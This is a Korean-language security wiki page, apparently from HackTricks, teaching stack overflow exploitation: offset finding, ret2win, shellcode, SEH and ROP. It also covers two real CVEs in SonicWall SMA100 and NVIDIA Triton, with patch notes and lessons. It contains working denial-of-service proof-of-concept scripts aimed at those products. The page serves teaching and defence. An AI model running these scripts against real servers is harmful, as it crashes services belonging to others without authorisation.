# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Stack Overflow란 무엇인가

A **stack overflow**는 프로그램이 스택에 할당된 크기보다 더 많은 데이터를 쓸 때 발생하는 취약점입니다. 이 초과 데이터는 인접 메모리 영역을 **덮어써서**, 유효한 데이터의 손상, 제어 흐름의 붕괴, 그리고 경우에 따라 악성 코드의 실행을 초래할 수 있습니다. 이러한 문제는 일반적으로 입력에 대해 경계 검사를 수행하지 않는 안전하지 않은 함수를 사용하면서 발생합니다.

이 덮어쓰기의 주요 문제는 이전 함수로 돌아가기 위한 **saved instruction pointer (EIP/RIP)**와 **saved base pointer (EBP/RBP)**가 **스택에 저장**된다는 점입니다. 따라서 공격자는 이를 덮어써서 프로그램의 실행 흐름을 **제어**할 수 있습니다.

이 취약점은 일반적으로 함수가 **스택 내부에 할당된 크기보다 더 많은 바이트를 복사**하기 때문에 발생하며, 그 결과 스택의 다른 부분을 덮어쓸 수 있게 됩니다.

취약하기 쉬운 일반적인 함수들로는 **`strcpy`, `strcat`, `sprintf`, `gets`** 등이 있습니다. 또한 **`fgets`**, **`read`** 및 **`memcpy`**처럼 **길이 인자(length argument)**를 받는 함수들도 지정된 길이가 할당된 크기보다 클 경우 취약하게 사용될 수 있습니다.

예를 들어, 다음 함수들이 취약할 수 있습니다:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Stack Overflows 오프셋 찾기

가장 흔한 방법은 `A`s를 매우 많이 입력(예: `python3 -c 'print("A"*1000)'`)해서 `Segmentation Fault`가 발생하는지 확인하는 것입니다. 이는 **주소 `0x41414141`에 접근을 시도했다는 것을 의미합니다**.

게다가, Stack Overflow 취약점이 있다는 것을 확인하면 **overwrite the return address**가 가능해지는 오프셋을 찾아야 합니다. 이를 위해 보통 **De Bruijn sequence**가 사용됩니다. 주어진 알파벳 크기 _k_와 부분시퀀스 길이 _n_에 대해, 이는 **모든 가능한 길이 _n_의 부분시퀀스가 정확히 한 번 연속 부분시퀀스로 나타나는 순환 시퀀스**입니다.

이렇게 하면 수동으로 어느 오프셋이 EIP를 제어하는지 알아낼 필요 없이, padding으로 이러한 시퀀스 중 하나를 사용하고 이를 덮어쓴 바이트의 오프셋을 찾을 수 있습니다.

이를 위해 **pwntools**를 사용할 수 있습니다:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
또는 **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Exploiting Stack Overflows

오버플로우가 발생하면(오버플로우 크기가 충분히 큰 경우) 스택 내부의 로컬 변수 값을 저장된 **EBP/RBP and EIP/RIP (or even more)**에 도달할 때까지 **덮어쓸 수 있습니다**.\
이 유형의 취약점을 악용하는 가장 일반적인 방법은 **modifying the return address**로, 함수가 끝날 때 이 포인터에 사용자가 지정한 위치로 **control flow will be redirected wherever the user specified**됩니다.

그러나 다른 시나리오에서는 단순히 스택의 일부 변수 값을 **overwriting some variables values in the stack**하는 것만으로도 익스플로잇에 충분할 수 있습니다(예: 쉬운 CTF challenges).

### Ret2win

이 유형의 CTF 문제에서는 바이너리 내부에 **함수(function)**가 존재하지만 **절대 호출되지 않으며**, **승리하려면 호출해야 합니다**. 이러한 문제에서는 **offset to overwrite the return address**를 찾고 호출할 **function의 address**를 찾기만 하면 됩니다(보통 [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html)는 비활성화되어 있음). 취약한 함수가 반환될 때 숨겨진 함수가 호출됩니다:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

이 시나리오에서는 공격자가 스택에 shellcode를 배치하고 제어된 EIP/RIP를 이용해 shellcode로 점프하여 임의의 코드를 실행할 수 있습니다:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

32-bit Windows에서는 오버플로우가 저장된 return address 대신 Structured Exception Handler (SEH) 체인을 덮어쓸 수 있습니다. 익스플로잇은 일반적으로 SEH 포인터를 POP POP RET gadget으로 교체하고 4-byte nSEH 필드를 짧은 점프(short jump)로 사용해 shellcode가 있는 큰 버퍼로 다시 피벗합니다. 흔한 패턴은 nSEH의 짧은 jmp가 nSEH 바로 앞에 배치된 5-byte near jmp에 착지하여 수백 바이트를 페이로드 시작으로 되돌리는 것입니다.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

이 기법은 이전 기법의 주요 보호 장치인 **No executable stack (NX)**를 우회하기 위한 기본 프레임워크입니다. 또한 바이너리에 존재하는 기존 명령들을 악용하여 최종적으로 임의의 명령을 실행하는 여러 다른 기법(ret2lib, ret2syscall...)을 수행할 수 있게 합니다:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

오버플로우가 항상 스택에만 발생하는 것은 아니며, 예를 들어 **heap**에서도 발생할 수 있습니다:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Types of protections

취약점 악용을 막기 위한 여러 보호 기법들이 있으며, 다음에서 확인할 수 있습니다:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

왜 **`sscanf` should never be trusted for parsing untrusted input**인지를 잘 보여주는 사례가 2025년 SonicWall의 SMA100 SSL-VPN 어플라이언스에서 나타났습니다. `/usr/src/EasyAccess/bin/httpd` 내부의 취약한 루틴은 `/__api__/`로 시작하는 모든 URI에서 버전과 엔드포인트를 추출하려고 시도합니다:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. 첫 번째 변환 (`%2s`)은 `version`에 **두** 바이트를 안전하게 저장합니다(예: "v1").
2. 두 번째 변환 (`%s`)은 **길이 지정자**가 없으므로, `sscanf`는 **첫 번째 NUL 바이트가 나올 때까지** 계속 복사합니다.
3. `endpoint`가 **stack**에 위치하고 **0x800 바이트 길이**이기 때문에, 0x800 바이트보다 긴 path를 제공하면 버퍼 뒤에 있는 모든 것이 손상됩니다 ‑ **stack canary**와 **saved return address**를 포함하여.

한 줄짜리 proof-of-concept만으로도 **인증 전에** 크래시를 발생시키기에 충분합니다:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
stack canaries가 프로세스를 중단시키더라도, 공격자는 여전히 **Denial-of-Service** primitive를 획득할 수 있습니다 (그리고 추가적인 정보 leaks가 있으면, code-execution도 가능할 수 있습니다). 교훈은 간단합니다:

* 항상 **최대 필드 너비**를 지정하세요 (예: `%511s`).
* `snprintf`/`strncpy_s`와 같은 더 안전한 대안을 선호하세요.

### 실제 사례: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA의 Triton Inference Server (≤ v25.06)에는 HTTP API를 통해 도달 가능한 여러 **stack-based overflows**가 포함되어 있었습니다.
취약한 패턴은 `http_server.cc`와 `sagemaker_server.cc`에서 반복적으로 나타났습니다:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent)는 현재 HTTP 요청 본문을 구성하는 내부 버퍼 세그먼트의 **개수**를 반환합니다.
2. 각 세그먼트는 `alloca()`를 통해 **16-byte** 크기의 `evbuffer_iovec`가 **stack**에 할당되게 하며 — **상한 없이**.
3. 클라이언트가 **HTTP _chunked transfer-encoding_**을 악용하면 요청을 **수십만 개의 6-byte chunks**(`"1\r\nA\r\n"`)으로 분할하도록 강제할 수 있습니다. 이로 인해 `n`은 stack이 고갈될 때까지 제약 없이 증가합니다.

#### 개념 증명 (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
~3 MB 요청이면 저장된 리턴 주소를 덮어쓰고 기본 빌드에서 데몬을 **crash**시킬 수 있습니다.

#### 패치 및 완화
25.07 릴리스에서는 안전하지 않은 스택 할당을 **힙 기반의 `std::vector`**로 교체하고 `std::bad_alloc`을 우아하게 처리합니다:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
배운 점:
* 공격자가 제어하는 크기로 `alloca()`를 호출하지 마라.
* Chunked requests는 server-side buffers의 형태를 급격히 바꿀 수 있다.
* 클라이언트 입력에서 유도된 값은 memory allocations에 사용하기 *전에* 검증하거나 제한하라.

## 참고 자료
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
